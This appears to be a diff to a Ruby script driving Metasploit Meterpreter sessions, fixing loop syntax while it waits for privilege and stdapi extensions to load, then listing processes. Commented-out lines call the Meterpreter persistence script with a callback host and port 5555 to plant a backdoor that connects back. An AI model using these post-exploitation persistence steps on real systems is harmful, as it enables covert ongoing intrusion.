@@ -38,8 +38,8 @@ def show_message(session)
     counter = 0
     while (!session.ext.dump_alias_tree('client').include?('client.priv') || !session.ext.dump_alias_tree('client').include?('client.stdapi'))
     puts "show_message: #{session.ext.dump_alias_tree('client')}"
-      counter++
-      if (counter == 10) do
+      counter += 1
+      if counter == 10
         return
       end
       sleep(1)
@@ -49,7 +49,7 @@ def show_message(session)
     processes = session.sys.process.get_processes
 
 #    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
-#    lhost = Rex::Socket.source_address(rhost);
+#    lhost = Rex::Socket.source_address("1.2.3.4");
 #    args = "run persistence -S -i 5 -p 5555 -r #{lhost}"
 #    session.execute_file(script_paths, args)
 
